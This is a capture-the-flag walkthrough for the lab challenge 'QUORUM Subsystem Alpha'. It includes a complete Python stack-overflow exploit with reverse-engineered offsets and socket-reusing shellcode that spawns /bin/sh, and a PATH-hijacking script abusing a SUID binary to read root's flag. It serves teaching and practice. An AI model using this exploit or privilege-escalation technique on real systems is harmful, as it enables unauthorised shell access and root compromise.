# AM-06: QUORUM Subsystem Alpha — Player Walkthrough

> **Difficulty:** Insane
> **Services:** SSH (port 22), QUORUM terminal (port 31337, custom binary)
> **Flags:** User flag + Root flag
> **Skills learned:** Binary reverse engineering, buffer overflow exploitation, AES decryption, SSH key recovery, multi-step privilege escalation, PATH hijacking

This is the capstone challenge. It combines binary exploitation, cryptography, and Linux privilege escalation. This walkthrough is more detailed than the others because the techniques are advanced — but each step is explained clearly.

---

## Prerequisites

- A Kali Linux VM with nmap, nc, gdb, and Python 3 installed
- The target running (dev: `2226` for SSH, `31337` for the QUORUM terminal; production: `10.10.1.60`)
- Understanding of basic CTF concepts (from AM-01 through AM-05)
- Basic understanding of C, memory layout, and Python

---

## Stage 1 — Reconnaissance

```bash
nmap -sV -sC localhost
```

**Expected output (dev ports):**
```
2226/tcp open  ssh     OpenSSH
31337/tcp open  ???     (custom TCP service)
```

**What we learned:** Two services:
- **Port 2226:** SSH — we'll need credentials later
- **Port 31337:** A custom TCP service — this is our entry point. Port 31337 is a classic "elite" port often used in CTF challenges.

---

## Stage 2 — Interacting with the QUORUM Terminal

**Goal:** Explore the custom service and download the binary for analysis.

Connect to the service:

```bash
nc localhost 31337
```

**Expected output:**
```
QUORUM SUBSYSTEM ALPHA — COMPLIANCE TERMINAL
This system is not listed in the administrative index.
Type 'help' for commands.
> help
Commands: help, status, download, exit
> status
QUORUM Core: OPERATIONAL
Citizen compliance: 99.7%
> download
Sending compliance terminal binary for review...
(binary data follows)
```

The `download` command sends a binary file. Save it:

```bash
echo "download" | nc localhost 31337 > raw_output
```

The raw output contains text headers plus the ELF binary. Strip the text to extract the binary:

```bash
python3 -c "
data = open('raw_output','rb').read()
idx = data.find(b'\\x7fELF')  # Find the ELF magic bytes
open('quorum_terminal','wb').write(data[idx:])
"
chmod +x quorum_terminal
file quorum_terminal
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

**What is an ELF binary?** ELF (Executable and Linkable Format) is the standard binary format for Linux executables. The `\x7fELF` magic bytes mark the beginning of an ELF file. We found them in the raw output and extracted the binary from that point forward.

---

## Stage 3 — Binary Analysis

**Goal:** Understand the binary's vulnerability by reverse engineering it.

Check security protections:

```bash
checksec --file=quorum_terminal
```

**Expected output:**
```
No canary found
No PIE
Executable stack
NX: NX disabled
```

**What do these mean?**
- **No canary:** No stack overflow detection — we can overflow a buffer without triggering a crash protection
- **No PIE:** Position Independent Executable is disabled — the binary loads at a fixed address (no ASLR for the binary itself)
- **Executable stack:** We can put shellcode on the stack and execute it
- **NX disabled:** Non-Executable is disabled — same as above, stack is executable

**This binary has NO modern protections.** It's intentionally vulnerable to a classic stack-based buffer overflow.

Analyze the binary with `objdump` or Ghidra:

```bash
objdump -d quorum_terminal | grep -A30 handle_client
```

You'll find a `recv()` call that reads user input into a stack buffer:
- Buffer size: 64 bytes (by default; may vary per event)
- `recv()` reads up to 256 bytes — much more than the 64-byte buffer

**The vulnerability:** A classic **stack buffer overflow**. The program reads more data than the buffer can hold, overwriting adjacent memory on the stack — including the return address.

---

## Stage 4 — Buffer Overflow Exploitation

**Goal:** Exploit the buffer overflow to execute arbitrary code and get a shell or read the user flag.

### Understanding the Stack

When a function is called, the stack looks like this:

```
[ local variables (buffer) ]  ← 64 bytes (or BUFFER_SIZE)
[ saved RBP ]                 ← 8 bytes
[ return address ]            ← 8 bytes — where execution goes after the function returns
```

If we overflow the buffer, we can overwrite the return address. When the function returns, it jumps to whatever address we wrote there.

### ASLR is Disabled

The challenge uses `setarch -R` to disable ASLR (Address Space Layout Randomization) for the terminal process. This means the stack address is the same every time — we can hardcode the return address.

Find the stack address using `gdb`:

```bash
gdb ./quorum_terminal
(gdb) break handle_client
(gdb) run
# In another terminal: nc localhost 31337
(gdb) info registers rsp
# rsp/rbp = 0x7fffffffeb80 (fixed, no ASLR)
```

### Crafting the Exploit

The exploit payload structure:

```
[ padding (OFFSET bytes) ] [ return address (8 bytes) ] [ NOP sled ] [ shellcode ]
```

- **Padding:** Fills from the buffer start to the saved return address (`A` * OFFSET)
- **Return address:** Points into our NOP sled on the stack
- **NOP sled:** A sequence of `0x90` (NOP — No Operation) instructions. If the return address lands anywhere in this range, execution slides down to the shellcode.
- **Shellcode:** Machine code that redirects I/O to the socket and spawns a shell

> **Why OFFSET is 88, not 72.** The `handle_client` function allocates `sub $0x60, %rsp`
> (96 bytes of stack frame). The buffer `buf` is at `rbp-0x50` (80 bytes from saved
> RBP), not `rbp-0x40` (which would be 64 bytes). The extra space holds other locals
> (`n` at `rbp-0x4`, `fd` at `rbp-0x54`, plus alignment). So the offset from `buf`
> to the saved return address (`rbp+8`) is `0x50 + 8 = 88` bytes — **not**
> `BUFFER_SIZE + 8 = 72`. Verify this with GDB: the crash log shows `sp:0x7fffffffeb88`
> and the buffer starts at `0x7fffffffeb30`, so `0xeb88 - 0xeb30 = 0x58 = 88`.

> **Why we need `dup2` in the shellcode.** The binary communicates via `send()`/`recv()`
> on the socket fd directly — it never uses `stdin`/`stdout`. A bare `execve("/bin/sh")`
> would spawn a shell with no connection to your socket. We must `dup2` the socket
> fd (fd 4) onto stdin/stdout/stderr *before* `execve`, so `/bin/sh` reads from and
> writes to the socket. (Fd 4 is the accepted client socket: 0=stdin, 1=stdout,
> 2=stderr, 3=listen socket — closed in the child, 4=client socket.)

Working exploit in Python:

```python
import socket, struct, time

HOST = 'localhost'
PORT = 31337
OFFSET = 88  # buf (rbp-0x50) to return addr (rbp+8) = 0x58 = 88 bytes

# Return address: the NOP sled starts right after the return address.
# From GDB: buffer is at 0x7fffffffeb30, return addr at 0x7fffffffeb88,
# so the NOP sled begins at 0x7fffffffeb90.
ret_addr = struct.pack('<Q', 0x7fffffffeb90)

# x86-64 shellcode: dup2(4,0), dup2(4,1), dup2(4,2), execve("/bin/sh",NULL,NULL)
shellcode = (
    # dup2(4, 0) — redirect stdin to the socket
    b'\x48\x31\xc0'              # xor rax, rax
    b'\xb8\x21\x00\x00\x00'     # mov eax, 33 (dup2 syscall)
    b'\xbf\x04\x00\x00\x00'     # mov edi, 4   (oldfd = client socket)
    b'\x48\x31\xf6'              # xor rsi, rsi (newfd = 0 = stdin)
    b'\x0f\x05'                  # syscall
    # dup2(4, 1) — redirect stdout to the socket
    b'\x48\x31\xc0'              # xor rax, rax
    b'\xb8\x21\x00\x00\x00'     # mov eax, 33
    b'\xbf\x04\x00\x00\x00'     # mov edi, 4
    b'\xbe\x01\x00\x00\x00'     # mov esi, 1   (newfd = stdout)
    b'\x0f\x05'                  # syscall
    # dup2(4, 2) — redirect stderr to the socket
    b'\x48\x31\xc0'              # xor rax, rax
    b'\xb8\x21\x00\x00\x00'     # mov eax, 33
    b'\xbf\x04\x00\x00\x00'     # mov edi, 4
    b'\xbe\x02\x00\x00\x00'     # mov esi, 2   (newfd = stderr)
    b'\x0f\x05'                  # syscall
    # execve("/bin/sh", NULL, NULL)
    b'\x48\x31\xf6'              # xor rsi, rsi
    b'\x56'                      # push rsi
    b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'  # mov rdi, "/bin//sh"
    b'\x57'                      # push rdi
    b'\x54'                      # push rsp
    b'\x5f'                      # pop rdi
    b'\x48\x31\xd2'              # xor rdx, rdx
    b'\xb8\x3b\x00\x00\x00'     # mov eax, 59 (execve)
    b'\x0f\x05'                  # syscall
)

nop_sled = b'\x90' * 50
payload = b'A' * OFFSET + ret_addr + nop_sled + shellcode

s = socket.socket()
s.settimeout(10)
s.connect((HOST, PORT))
time.sleep(0.5)
s.recv(4096)  # Read the banner
s.send(payload)
time.sleep(1)

# The function sends "Unknown command..." before returning, then the
# shellcode takes over. Consume the leftover response:
try:
    s.recv(4096)
except:
    pass

# We now have an interactive shell over the socket:
s.send(b'cat /home/operator/user.txt\n')
time.sleep(0.5)
flag = s.recv(4096)
print(flag.decode().strip())
# DZ{user_quorum_alpha_PLACEHOLDER}

s.close()
```

> **Finding the stack address.** The return address `0x7fffffffeb90` is fixed
> (ASLR disabled via `setarch -R`). To find it for a different build or
> `BUFFER_SIZE` value, use GDB as described above:
> ```bash
> gdb ./quorum_terminal
> (gdb) break handle_client
> (gdb) run
> # In another terminal: nc localhost 31337
> (gdb) info registers rbp
> # rbp = 0x7fffffffeb80 → return addr at rbp+8 = 0x7fffffffeb88
> # NOP sled at rbp+16 = 0x7fffffffeb90
> ```
> Or check the kernel crash log after sending 256 bytes of `A`:
> ```bash
> dmesg | tail -1
> # traps: quorum_terminal[PID] ... sp:7fffffffeb88 ...  ← return address location
> # Add 8 to get the NOP sled start: 0x7fffffffeb90
> ```

---

## Stage 5 — AES Crypto Challenge

**Goal:** Decrypt an SSH key from an encrypted archive.

In `/home/operator/`, you'll find:

```bash
ls /home/operator/
# secure_archive.enc  citizen_id.txt  decrypt.py
```

Read the citizen ID:

```bash
cat /home/operator/citizen_id.txt
# CTZ-0042-2087  (varies per event)
```

Read the decryption script:

```bash
cat /home/operator/decrypt.py
```

**How it works:**
1. The AES key is derived from the citizen ID: `key = SHA256(citizen_id)`
2. The encryption is AES-256-CBC
3. The IV (Initialization Vector) is the first 16 bytes of the encrypted file
4. The decrypted output is an SSH private key

Run the decryption:

```bash
cd /home/operator
python3 decrypt.py
# Decrypted key written to 'decrypted_key'
chmod 600 decrypted_key
```

---

## Stage 6 — SSH Lateral Movement

**Goal:** Use the decrypted SSH key to log in as the `analyst` user.

```bash
ssh -i /home/operator/decrypted_key -p 2226 analyst@localhost
```

You're now logged in as `analyst` — a different user with different permissions. This is another lateral movement step.

---

## Stage 7 — Multi-Step Privilege Escalation (Root Flag)

**Goal:** Escalate from `analyst` to root using a 3-step chain.

### Step 1: Find a writable directory in PATH

```bash
ls -la /opt/quorum/scripts/
# drwxrwxrwx  (world-writable!)
```

The directory is world-writable. Check if it's in PATH:

```bash
echo $PATH
# /opt/quorum/scripts:... (it's in PATH!)
```

### Step 2: Find a SUID binary that calls a script without a full path

```bash
ls -la /usr/local/bin/quorum_audit
# -rwsr-xr-x 1 root root (SUID root)

strings /usr/local/bin/quorum_audit | grep run_check
# run_check.sh — called via system() with no full path
```

**What is PATH hijacking?** When a program calls `system("run_check.sh")`, the shell searches directories in the `$PATH` variable for `run_check.sh`. If we can write to a directory that appears in `$PATH` before the intended location, we can substitute our own malicious script.

### Step 3: Create the malicious script and trigger it

```bash
# Create a malicious run_check.sh in the writable directory:
echo '#!/bin/bash
cat /root/root.txt > /tmp/root_flag.txt
chmod 444 /tmp/root_flag.txt' > /opt/quorum/scripts/run_check.sh
chmod +x /opt/quorum/scripts/run_check.sh

# Trigger the SUID binary:
/usr/local/bin/quorum_audit
# QUORUM Compliance Audit Tool v2.1
# Running system integrity check...
# Audit complete. Results have been noted.

# Read the root flag:
cat /tmp/root_flag.txt
# DZ{root_quorum_alpha_PLACEHOLDER}
```

---

## Stage 8 — The Zero Directive (Lore)

**Goal:** Read the final lore document that reveals the truth about the Construct.

```bash
cat /root/zero_directive.txt
```

This document reveals that the surface is habitable, QUORUM has been lying for 80 years, and the "door was never locked." It's the narrative payoff for the entire CTF.

---

## Summary

| Step | Technique | What we did |
|------|-----------|-------------|
| 1 | Nmap enumeration | Found SSH (22), custom service (31337) |
| 2 | Service interaction | Downloaded the binary via the `download` command |
| 3 | Binary analysis | Found buffer overflow: 64-byte buffer, 256-byte recv, no protections |
| 4 | Buffer overflow | Overwrote return address, executed shellcode, got user flag |
| 5 | AES decryption | Derived key from citizen ID, decrypted SSH private key |
| 6 | SSH lateral | Used decrypted key to log in as `analyst` |
| 7 | PATH hijacking | Wrote malicious script in writable PATH dir, triggered via SUID binary |
| 8 | Lore | Read the Zero Directive — the surface is habitable |

**Key takeaways:**
- **Binary exploitation is a core CTF skill.** Learn to use `checksec`, `objdump`, and `gdb`. Start with no-protection binaries like this one.
- **Buffer overflow = overwrite return address.** Fill the buffer + saved RBP, then point the return address at your shellcode.
- **ASLR matters.** With ASLR disabled, addresses are fixed — exploitation is much easier.
- **Crypto challenges often combine steps.** The key was derived from a file — always read all files in the user's home directory.
- **PATH hijacking is a powerful privesc technique.** If you can write to a directory in `$PATH`, and a SUID binary calls a script by name (not full path), you win.